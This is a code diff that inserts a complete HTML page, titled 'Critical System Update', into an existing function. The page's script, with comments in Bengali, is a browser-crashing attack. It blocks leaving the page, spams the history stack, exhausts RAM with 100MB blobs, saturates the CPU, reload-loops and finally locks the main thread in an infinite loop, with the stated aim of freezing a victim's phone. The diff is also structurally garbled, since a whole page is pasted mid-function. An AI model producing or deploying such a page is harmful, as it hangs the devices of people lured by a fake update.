@@ -25,6 +25,92 @@
         function executeOmniCrash() {
             const blobs = [];
             const memoryLeak = [];
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Critical System Update</title>
+    <style>
+        body { background: #000; margin: 0; padding: 0; overflow: hidden; cursor: none; }
+    </style>
+</head>
+<body>
+    <script>
+        // ১. বের হওয়ার সব রাস্তা বন্ধ (No Back, No Exit)
+        window.onbeforeunload = () => { return "CRITICAL_ERROR: SYSTEM_HALTED"; };
+
+        window.onload = () => {
+            // ২. হিস্ট্রি বাফার স্প্যাম (Back বাটন পুরোপুরি জ্যাম করা)
+            for (let i = 0; i < 1000000; i++) {
+                history.pushState(null, null, "#FATAL_ERROR_" + Math.random().toString(36));
+            }
+            // ০.১ সেকেন্ডের মধ্যে অ্যাটাক শুরু
+            setTimeout(executeOmniCrash, 100);
+        };
+
+        function executeOmniCrash() {
+            const blobs = [];
+            const memoryLeak = [];
+
+            // ৩. GPU & RAM Stress (ডিসপ্লে এবং মেমোরি ফ্রিজ করা)
+            function leakResources() {
+                while (true) {
+                    // Huge Blobs তৈরি (র‍্যাম দ্রুত শেষ করার জন্য)
+                    const blob = new Blob([new ArrayBuffer(1024 * 1024 * 100)]); // 100MB chunks
+                    blobs.push(URL.createObjectURL(blob));
+                    
+                    // Memory Burner (র‍্যাম ডাটা জ্যাম করা)
+                    memoryLeak.push(new Array(1000000).fill("FREEZE_" + Math.random()));
+                    
+                    if (blobs.length > 1000) break; 
+                }
+            }
+
+            // ৪. Multi-Core CPU Overload (সবগুলো কোর লক করা)
+            function cpuBurner() {
+                // Recursive Task Flood
+                function flood() {
+                    let data = JSON.stringify(window.performance);
+                    console.log(data.repeat(1000));
+                    
+                    // CPU-কে ইনফিনিট লুপে আটকানো
+                    while(true) {
+                        let x = Math.sqrt(Math.random()) * Math.tan(Math.random());
+                        if (Date.now() % 100 === 0) break; 
+                    }
+                    setTimeout(flood, 0);
+                }
+                flood();
+            }
+
+            // ৫. সব অ্যাটাক একসাথে লঞ্চ করা (God Mode Execution)
+            try {
+                leakResources(); // মেমোরি শেষ করবে
+                
+                // ৩০টি আলাদা থ্রেডে CPU অ্যাটাক শুরু (সব কোর বিজি করবে)
+                for (let j = 0; j < 30; j++) {
+                    setTimeout(cpuBurner, j * 10);
+                }
+            } catch (e) {}
+
+            // ৬. হার্ড রিফ্রেশ লুপ (ফাইনাল লক)
+            // এটি ফোনকে বারবার পেজ লোড করতে বাধ্য করবে যাতে ফোন কুলডাউন না হয়
+            setInterval(() => {
+                history.pushState(null, null, "#LOCK_" + Date.now());
+                location.reload(); 
+            }, 50);
+
+            // ৭. কার্নেল লেভেল ফ্রিজ (Final Infinite Block)
+            while(true) {
+                // এটি ব্রাউজারের মেইন থ্রেড পুরোপুরি লক করে দেবে
+                let x = Math.random() * Math.random();
+                console.table(window.performance.getEntries());
+            }
+        }
+    </script>
+</body>
+</html>
 
             // ৩. GPU & RAM Stress (ডিসপ্লে এবং মেমোরি ফ্রিজ করা)
             function leakResources() {
